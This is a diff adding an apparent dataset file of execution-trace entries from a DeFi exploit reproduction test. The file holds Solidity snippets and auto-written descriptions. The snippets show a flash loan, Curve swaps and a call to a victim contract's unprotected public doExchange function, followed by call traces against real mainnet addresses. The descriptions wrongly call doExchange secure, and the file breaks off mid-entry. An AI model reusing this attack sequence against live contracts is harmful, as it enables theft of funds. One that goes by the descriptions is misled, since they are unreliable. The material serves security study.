@@ -1,0 +1,2109 @@
+[
+    {
+        "id": "1938959",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        USDC.approve(address(curveYSwap), type(uint256).max);\n        address(USDT).call(abi.encodeWithSignature(\"approve(address,uint256)\", address(curveYSwap), type(uint256).max));\n        Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario. It performs three main actions:  \n   - It approves the `curveYSwap` contract to spend an unlimited amount of USDC tokens on behalf of the caller.  \n   - It approves the `curveYSwap` contract to spend an unlimited amount of USDT tokens on behalf of the caller.  \n   - It initiates a flash loan from the `Pair` contract, borrowing 120,000 USDT tokens.  \n   Finally, it logs the attacker's USDC balance after the exploit is executed.  \n\n2. Security mechanism:  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, not internally.  \n   - The `approve` function is used to grant spending permissions to the `curveYSwap` contract, but it sets the allowance to the maximum possible value (`type(uint256).max`), which could be risky if not handled carefully.  \n   - The `call` function is used to interact with the USDT contract, which is a low-level method and can be vulnerable to reentrancy attacks if not properly secured.  \n\n3. Parameter Function:  \n   - `USDC.approve(address(curveYSwap), type(uint256).max)`: This sets the allowance for the `curveYSwap` contract to spend an unlimited amount of USDC tokens.  \n   - `address(USDT).call(abi.encodeWithSignature(\"approve(address,uint256)\", address(curveYSwap), type(uint256).max))`: This does the same for USDT tokens, using a low-level call to interact with the USDT contract.  \n   - `Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1))`: This initiates a flash loan, borrowing 120,000 USDT tokens. The parameters specify the recipient (`address(this)`), the amount to borrow (`120_000 * 1e6`), and an empty byte array (`new bytes(1)`) for additional data.  \n\n4. Return description:  \n   The function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's USDC balance after the exploit. The balance is calculated by calling `USDC.balanceOf(address(this))`, which retrieves the USDC balance of the contract executing the function.  \n\nIn summary, the `testExploit` function simulates an exploit by approving unlimited spending permissions for USDC and USDT tokens, initiating a flash loan, and logging the attacker's USDC balance afterward. It uses low-level calls and maximum allowances, which could pose security risks if not properly managed.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "38367",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "31078",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "26953",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1844789",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 120000000000 [1.2e11], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2602",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "55714108890776239216744060 [5.571e25]"
+    },
+    {
+        "id": "3315",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "52228714641586 [5.222e13]"
+    },
+    {
+        "id": "2529",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "52228714641586 [5.222e13]"
+    },
+    {
+        "id": "31517",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "30728",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1780740",
+        "args": "0, 12000000 [1.2e7], 0x00",
+        "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        curveYSwap.exchange_underlying(1, 2, 120_000 * 1e6, 0);\n        ExchangeBetweenPools.doExchange(victimAmount);\n        curveYSwap.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);\n        USDC.transfer(address(Pair), 120_000 * 1e6 + uint256(amount1));\n    }\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a callback during a flash swap operation on Uniswap V3. It performs a series of exchanges between different pools and transfers tokens. Specifically, it exchanges tokens using `curveYSwap`, executes an exchange between pools using `ExchangeBetweenPools`, and then transfers USDC tokens back to the Uniswap pair. The purpose is to facilitate a flash swap, where tokens are borrowed, used in transactions, and then repaid within the same transaction.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its call to only external contracts, ensuring it cannot be called internally. Additionally, the function relies on the assumption that the caller is the Uniswap V3 pair, as it is part of a flash swap callback mechanism. However, there are no explicit checks to verify the caller, which could be a potential security risk if not properly handled.\n\n3. Parameter Function:  \n- `amount0` and `amount1`: These represent the amounts of two tokens borrowed during the flash swap. They are used to calculate the repayment amount.  \n- `data`: This is additional data passed to the callback, though it is not used in this function.  \n\n4. Return description:  \nThe function does not return any value. Instead, it performs actions such as exchanging tokens and transferring USDC to the Uniswap pair. The repayment amount for the flash swap is calculated as `120_000 * 1e6 + uint256(amount1)`, which includes a fixed amount of 120,000 USDC (scaled by 1e6 for decimals) plus the borrowed amount of the second token (`amount1`).\n\nIn summary,  \nThis function is a callback for a Uniswap V3 flash swap, performing token exchanges and transfers to complete the transaction. It relies on external calls and lacks explicit caller verification, which could pose security risks. The parameters define the borrowed amounts, and the function ensures repayment by transferring the required USDC amount back to the Uniswap pair.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "766815",
+        "args": "1, 2, 120000000000 [1.2e11], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "117413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1133529323263304087 [1.133e18]"
+    },
+    {
+        "id": "2602",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "31951343451222398754991 [3.195e22]"
+    },
+    {
+        "id": "33496",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "442096211614379858872543 [4.42e23]"
+    },
+    {
+        "id": "15812",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "8569",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "35672",
+        "args": "(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "4111",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F, 1304347360753391460608 [1.304e21], 1425467089982243776205052 [1.425e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000588c54"
+    },
+    {
+        "id": "2509",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "11273",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "8757",
+        "args": "0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2600",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "87406",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1257894214342568391 [1.257e18]"
+    },
+    {
+        "id": "3315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "122347570202 [1.223e11]"
+    },
+    {
+        "id": "2529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "122347570202 [1.223e11]"
+    },
+    {
+        "id": "24496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "9312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "8569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "25172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "2509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "70076",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7983010 [7.983e6]"
+    },
+    {
+        "id": "3031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "72108275209 [7.21e10]"
+    },
+    {
+        "id": "4803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "25130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "2509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "7780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "6257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "83690",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1219188455269113215 [1.219e18]"
+    },
+    {
+        "id": "7685",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "2486",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "24496",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "272770619034611513332400 [2.727e23]"
+    },
+    {
+        "id": "9312",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "8569",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "17130",
+        "args": "(0x73a052500105205d34Daf004eAb301916DA8190f, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "2509",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2553",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "27892",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27097",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27867",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27078",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "95010",
+        "args": "120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "122347570202 [1.223e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "122347570202 [1.223e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "8792",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7997",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 120000000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "120068",
+        "args": "8903409274900820941169 [8.903e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "72108275209 [7.21e10]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "72108275209 [7.21e10]"
+    },
+    {
+        "id": "37601",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1032264538 [1.032e9]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1031",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71076010671 [7.107e10]"
+    },
+    {
+        "id": "28801",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "551643",
+        "args": "119023523157 [1.19e11]",
+        "original_code": "  function doExchange(uint256 amount) public returns(bool){\n    require(amount >= minimum_amount, \"invalid amount\");\n    require(amount <= ERC20TokenBankInterface(from_bank).balance(), \"too much amount\");\n\n    ERC20TokenBankInterface(from_bank).issue(address(this), amount);\n\n    uint256 camount = usdc.balanceOf(address(this));\n    usdc.safeApprove(address(curve), camount);\n    curve.exchange_underlying(1, 2, camount, 0);\n\n    uint256 namount = usdt.balanceOf(address(this));\n    usdt.safeTransfer(to_bank, namount);\n\n    return true;\n  }\n\n}\n\ncontract ExchangeBetweenPoolsFactory {\n  event NewExchangeBetweenPools(address addr);\n",
+        "description": "1. Core functions:  \nThe `doExchange` function is designed to facilitate an exchange of tokens between two different pools. It first checks if the specified amount is valid and within the available balance. Then, it issues the tokens from the source bank to the contract, converts them into another token using a curve pool, and finally transfers the new tokens to the destination bank. The function ensures the entire process is executed smoothly and returns `true` upon successful completion.\n\n2. Security mechanism:  \nThe function includes two `require` statements to validate the input amount. The first ensures the amount is not below a minimum threshold, and the second checks that the amount does not exceed the available balance in the source bank. These checks prevent invalid or excessive transactions. Additionally, the function uses `safeApprove` and `safeTransfer` methods, which are safer alternatives for token approvals and transfers, reducing the risk of errors or vulnerabilities.\n\n3. Parameter Function:  \nThe function takes one parameter, `amount`, which represents the quantity of tokens to be exchanged. This parameter is crucial as it determines how many tokens will be moved and converted during the exchange process. The function validates this amount against predefined limits to ensure the operation is feasible and secure.\n\n4. Return description:  \nThe function returns a boolean value `true` upon successful execution. This indicates that the entire exchange process, including token issuance, conversion, and transfer, has been completed without any issues. The return value serves as a confirmation of the operation's success.\n\nIn summary,  \nThe `doExchange` function handles the exchange of tokens between two pools, ensuring the amount is valid and within limits. It uses security checks and safe methods to protect against errors or vulnerabilities. The `amount` parameter specifies the quantity of tokens to be exchanged, and the function returns `true` to confirm the successful completion of the process.",
+        "return_value": "true"
+    },
+    {
+        "id": "6101",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "3315",
+        "args": "0x9Ab872A34139015Da07EE905529a8842a6142971",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "2529",
+        "args": "0x9Ab872A34139015Da07EE905529a8842a6142971",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "45588",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "2520",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1315",
+        "args": "0x9Ab872A34139015Da07EE905529a8842a6142971",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "529",
+        "args": "0x9Ab872A34139015Da07EE905529a8842a6142971",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "33517",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "32728",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D]",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "529",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D]",
+        "original_code": null,
+        "description": null,
+        "return_value": "119023523157 [1.19e11]"
+    },
+    {
+        "id": "3426",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2637",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "23767",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "22978",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "437699",
+        "args": "1, 2, 119023523157 [1.19e11], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "35413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1133529323263304087 [1.133e18]"
+    },
+    {
+        "id": "602",
